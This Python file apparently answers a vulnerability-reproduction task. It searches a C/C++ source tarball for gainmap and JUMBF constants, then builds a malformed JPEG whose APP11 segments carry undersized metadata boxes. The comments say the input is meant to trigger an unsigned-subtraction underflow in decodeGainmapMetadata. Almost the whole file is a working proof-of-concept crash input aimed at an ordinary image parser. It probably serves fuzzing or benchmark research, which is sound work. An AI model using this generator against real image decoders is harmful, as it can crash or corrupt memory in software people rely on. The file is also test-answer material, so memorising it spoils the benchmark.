import io
import os
import re
import struct
import tarfile
from typing import List, Optional, Tuple, Dict, Set


def _be16(n: int) -> bytes:
    return struct.pack(">H", n & 0xFFFF)


def _be32(n: int) -> bytes:
    return struct.pack(">I", n & 0xFFFFFFFF)


def _jpeg_segment(marker: int, payload: bytes) -> bytes:
    # marker is the second byte after 0xFF, e.g. 0xE0 for APP0, 0xEB for APP11.
    # length includes the 2-byte length field itself.
    L = len(payload) + 2
    if L < 2:
        L = 2
    if L > 0xFFFF:
        payload = payload[: 0xFFFF - 2]
        L = 0xFFFF
    return bytes([0xFF, marker]) + _be16(L) + payload


def _jpeg_app0_jfif() -> bytes:
    # Minimal JFIF APP0 segment.
    # "JFIF\0" + ver 1.01 + units 0 + Xdensity 1 + Ydensity 1 + Xthumb 0 + Ythumb 0
    payload = b"JFIF\x00" + b"\x01\x01" + b"\x00" + _be16(1) + _be16(1) + b"\x00\x00"
    return _jpeg_segment(0xE0, payload)


def _box(type4: bytes, payload: bytes, size_override: Optional[int] = None) -> bytes:
    if len(type4) != 4:
        type4 = (type4 + b"\x00\x00\x00\x00")[:4]
    if size_override is None:
        size = 8 + len(payload)
    else:
        size = size_override
    return _be32(size) + type4 + payload


def _make_jumd(uuid16: bytes, extended: bool = False) -> bytes:
    uuid16 = (uuid16 + (b"\x00" * 16))[:16]
    payload = b"\x00\x00\x00\x00" + uuid16
    if extended:
        # Add some plausible trailing fields (toggles + lengths) as zeros
        payload += b"\x00" + _be32(0) + _be32(0) + _be32(0)
    return _box(b"jumd", payload)


def _make_jumb_entity(uuid16: bytes, content_box: bytes, extended_jumd: bool = False) -> bytes:
    jumd = _make_jumd(uuid16, extended=extended_jumd)
    return _box(b"jumb", jumd + content_box)


def _score_context(text: str, idx: int, window: int = 200) -> str:
    lo = max(0, idx - window)
    hi = min(len(text), idx + window)
    return text[lo:hi].lower()


def _parse_initializer_list(list_text: str) -> Optional[bytes]:
    inner = list_text.strip()
    if not (inner.startswith("{") and inner.endswith("}")):
        return None
    inner = inner[1:-1]
    tokens = [t.strip() for t in inner.split(",") if t.strip()]
    vals: List[int] = []
    for tok in tokens:
        tok = tok.strip()
        if not tok:
            continue
        # Remove C/C++ suffixes
        tok = re.sub(r"[uUlL]+$", "", tok)
        if tok.startswith("'") and tok.endswith("'") and len(tok) >= 3:
            body = tok[1:-1]
            if body.startswith("\\x") and len(body) == 4:
                try:
                    vals.append(int(body[2:], 16) & 0xFF)
                except Exception:
                    return None
            elif body.startswith("\\") and len(body) >= 2:
                esc = body[1:]
                if esc == "0":
                    vals.append(0)
                elif esc == "n":
                    vals.append(10)
                elif esc == "r":
                    vals.append(13)
                elif esc == "t":
                    vals.append(9)
                elif esc == "\\":
                    vals.append(92)
                elif esc == "'":
                    vals.append(39)
                elif esc == '"':
                    vals.append(34)
                else:
                    # best-effort: single char
                    if len(body) == 1:
                        vals.append(ord(body) & 0xFF)
                    else:
                        return None
            else:
                if len(body) != 1:
                    return None
                vals.append(ord(body) & 0xFF)
        elif tok.startswith("0x") or tok.startswith("0X"):
            try:
                vals.append(int(tok, 16) & 0xFF)
            except Exception:
                return None
        else:
            m = re.match(r"^-?\d+$", tok)
            if not m:
                return None
            try:
                vals.append(int(tok) & 0xFF)
            except Exception:
                return None
    if not vals:
        return None
    return bytes(vals)


def _extract_jp_headers(blobs: List[Tuple[str, bytes]]) -> List[bytes]:
    best: Dict[bytes, int] = {}
    for name, data in blobs:
        try:
            text = data.decode("utf-8", "ignore")
        except Exception:
            continue
        for m in re.finditer(r"\{[^{}]{0,200}\}", text, flags=re.DOTALL):
            block = m.group(0)
            if ("'J'" not in block and "0x4A" not in block and "0X4A" not in block and "74" not in block) or (
                "'P'" not in block and "0x50" not in block and "0X50" not in block and "80" not in block
            ):
                continue
            b = _parse_initializer_list(block)
            if not b:
                continue
            if len(b) < 2 or len(b) > 16:
                continue
            if b[0] != 0x4A or b[1] != 0x50:
                continue
            ctx = _score_context(text, m.start())
            score = 1
            if "jumbf" in ctx:
                score += 5
            if "app11" in ctx or "ffeb" in ctx:
                score += 5
            if "identifier" in ctx or "signature" in ctx:
                score += 2
            if "jpeg" in ctx:
                score += 1
            if "jp" in ctx:
                score += 1
            # Prefer typical length 6 (JP + instance + seq)
            if len(b) == 6:
                score += 3
            best[b] = max(best.get(b, 0), score)

        # Also try string literals containing JP
        for m in re.finditer(r"\"([^\"]{2,16})\"", text):
            s = m.group(1)
            if not s.startswith("JP"):
                continue
            try:
                raw = s.encode("latin1", "ignore")
            except Exception:
                continue
            if len(raw) < 2 or len(raw) > 16:
                continue
            if raw[:2] != b"JP":
                continue
            ctx = _score_context(text, m.start())
            score = 1
            if "jumbf" in ctx:
                score += 5
            if "app11" in ctx:
                score += 3
            best[raw] = max(best.get(raw, 0), score)

    headers = sorted(best.items(), key=lambda kv: (-kv[1], len(kv[0])))
    return [h for h, _ in headers[:4]]


def _extract_uuid16(blobs: List[Tuple[str, bytes]]) -> Optional[bytes]:
    candidates: List[Tuple[int, bytes]] = []
    for name, data in blobs:
        try:
            text = data.decode("utf-8", "ignore")
        except Exception:
            continue
        # Search for small initializer blocks around gainmap-related contexts
        for m in re.finditer(r"\{[^{}]{0,600}\}", text, flags=re.DOTALL):
            block = m.group(0)
            b = _parse_initializer_list(block)
            if not b or len(b) != 16:
                continue
            ctx = _score_context(text, m.start())
            score = 1
            if "uuid" in ctx or "guid" in ctx:
                score += 6
            if "gain" in ctx:
                score += 6
            if "jumb" in ctx or "jumbf" in ctx:
                score += 2
            if "metadata" in ctx:
                score += 1
            if "content" in ctx and "type" in ctx:
                score += 2
            # Avoid all-zeros if possible
            if any(x != 0 for x in b):
                score += 1
            candidates.append((score, b))

        # Look for hex UUID string patterns and parse if found
        for m in re.finditer(r"([0-9a-fA-F]{8})-([0-9a-fA-F]{4})-([0-9a-fA-F]{4})-([0-9a-fA-F]{4})-([0-9a-fA-F]{12})", text):
            ctx = _score_context(text, m.start())
            score = 5
            if "gain" in ctx:
                score += 6
            if "uuid" in ctx:
                score += 4
            hx = "".join(m.groups())
            try:
                b = bytes.fromhex(hx)
            except Exception:
                continue
            if len(b) == 16:
                candidates.append((score, b))

    if not candidates:
        return None
    candidates.sort(key=lambda x: -x[0])
    for score, b in candidates:
        if any(x != 0 for x in b):
            return b
    return candidates[0][1]


def _extract_fourcc_candidates(blobs: List[Tuple[str, bytes]]) -> Set[bytes]:
    out: Set[bytes] = set()
    pat = re.compile(r"(SkFourByteTag|FOURCC|MAKEFOURCC)\s*\(\s*'(.{1})'\s*,\s*'(.{1})'\s*,\s*'(.{1})'\s*,\s*'(.{1})'\s*\)")
    for _, data in blobs:
        try:
            text = data.decode("utf-8", "ignore")
        except Exception:
            continue
        for m in pat.finditer(text):
            c1, c2, c3, c4 = m.group(2), m.group(3), m.group(4), m.group(5)
            s = (c1 + c2 + c3 + c4).encode("latin1", "ignore")
            if len(s) == 4 and all(32 <= b <= 126 for b in s):
                out.add(s)
        # Also pull direct "gmmd"/"gmap" literals if present
        for lit in re.findall(r"\"([A-Za-z0-9]{4})\"", text):
            out.add(lit.encode("ascii", "ignore"))
    return out


def _tar_iter_source_blobs(src_path: str, max_file_size: int = 2_000_000) -> List[Tuple[str, bytes]]:
    blobs: List[Tuple[str, bytes]] = []
    with tarfile.open(src_path, "r:*") as tf:
        for m in tf:
            if not m.isreg():
                continue
            if m.size <= 0 or m.size > max_file_size:
                continue
            name = m.name
            lower = name.lower()
            if not (lower.endswith(".c") or lower.endswith(".cc") or lower.endswith(".cpp") or lower.endswith(".h") or lower.endswith(".hpp") or lower.endswith(".inc")):
                continue
            f = tf.extractfile(m)
            if not f:
                continue
            try:
                data = f.read()
            except Exception:
                continue
            blobs.append((name, data))
    return blobs


def _detect_direct_fuzzer(blobs: List[Tuple[str, bytes]]) -> bool:
    # Look for a fuzzer harness that calls decodeGainmapMetadata directly.
    for name, data in blobs:
        ln = name.lower()
        if "fuzz" not in ln and "fuzzer" not in ln and "oss-fuzz" not in ln:
            continue
        if b"LLVMFuzzerTestOneInput" in data and b"decodeGainmapMetadata" in data:
            return True
    return False


def _find_decodegainmap_blobs(blobs: List[Tuple[str, bytes]], limit: int = 20) -> List[Tuple[str, bytes]]:
    out = []
    for name, data in blobs:
        if b"decodeGainmapMetadata" in data:
            out.append((name, data))
            if len(out) >= limit:
                break
    return out


class Solution:
    def solve(self, src_path: str) -> bytes:
        blobs = _tar_iter_source_blobs(src_path)

        direct_fuzzer = _detect_direct_fuzzer(blobs)

        decode_blobs = _find_decodegainmap_blobs(blobs, limit=5)
        # Candidate blobs for extracting constants: anything mentioning gainmap/jumbf/jpeg/jumb
        cand_blobs: List[Tuple[str, bytes]] = []
        for name, data in blobs:
            ln = name.lower()
            if ("gain" in ln) or ("jumb" in ln) or ("jpeg" in ln) or ("uhdr" in ln) or ("codec" in ln) or ("exif" in ln):
                cand_blobs.append((name, data))
                continue
            dlow = data.lower()
            if (b"gainmap" in dlow) or (b"jumbf" in dlow) or (b"app11" in dlow) or (b"ffeb" in dlow) or (b"hdr" in dlow and b"gain" in dlow):
                cand_blobs.append((name, data))

        # Ensure decode blobs are included
        for it in decode_blobs:
            if it not in cand_blobs:
                cand_blobs.append(it)

        # Extract constants
        jp_headers = _extract_jp_headers(cand_blobs)
        uuid16 = _extract_uuid16(cand_blobs) or (b"\x00" * 16)

        fourcc = _extract_fourcc_candidates(cand_blobs)
        # Preferred bad metadata types: include typical and any extracted with "gm"/"gain" hints
        bad_types: List[bytes] = []
        for t in (b"gmmd", b"gmap"):
            if t not in bad_types:
                bad_types.append(t)
        for t in sorted(fourcc):
            tl = t.lower()
            if any(c < 32 or c > 126 for c in t) or len(t) != 4:
                continue
            if tl in (b"jumb", b"jumd", b"uuid"):
                continue
            if (b"gm" in tl) or (b"gain"[:2] in tl) or (tl.startswith(b"gm")):
                if t not in bad_types:
                    bad_types.append(t)
            if len(bad_types) >= 6:
                break

        if not jp_headers:
            # Common JUMBF APP11 identifier variants: "JP" + instance(2) + sequence(2)
            jp_headers = [
                b"JP" + b"\x00\x00" + b"\x00\x01",
                b"JP" + b"\x00\x01" + b"\x00\x01",
                b"JP" + b"\x00\x01" + b"\x00\x00",
                b"JP" + b"\x00\x00" + b"\x00\x00",
            ]

        # Build a bad metadata payload that likely triggers unsigned-subtraction underflow.
        # Primary: a "gmap" box containing one or more undersized boxes (size < 8).
        bad_inner = b"".join(_box(t, b"", size_override=4) for t in bad_types[:3])
        gmap_box = _box(b"gmap", bad_inner)
        # Alternate: "uuid" box with uuid + bad boxes
        uuid_box = _box(b"uuid", uuid16 + bad_inner)

        # Compose JUMBF entities
        entity_nested = _make_jumb_entity(uuid16, gmap_box, extended_jumd=False)
        entity_uuid = _make_jumb_entity(uuid16, uuid_box, extended_jumd=True)

        if direct_fuzzer:
            # Return raw box data, in case the harness feeds bytes directly to the decoder.
            # Provide both entities back-to-back; most parsers will scan and pick one.
            return entity_nested + entity_uuid

        # Otherwise, wrap in minimal JPEG with APP11 segments.
        app11_1 = _jpeg_segment(0xEB, jp_headers[0] + entity_nested)
        # If UUID wasn't found (all zeros), include a second variant to increase chances.
        include_second = (uuid16 == b"\x00" * 16) or (len(jp_headers) > 1)
        if include_second:
            hdr2 = jp_headers[1] if len(jp_headers) > 1 else jp_headers[0]
            app11_2 = _jpeg_segment(0xEB, hdr2 + entity_uuid)
        else:
            app11_2 = b""

        jpeg = b"\xFF\xD8" + _jpeg_app0_jfif() + app11_1 + app11_2 + b"\xFF\xD9"
        return jpeg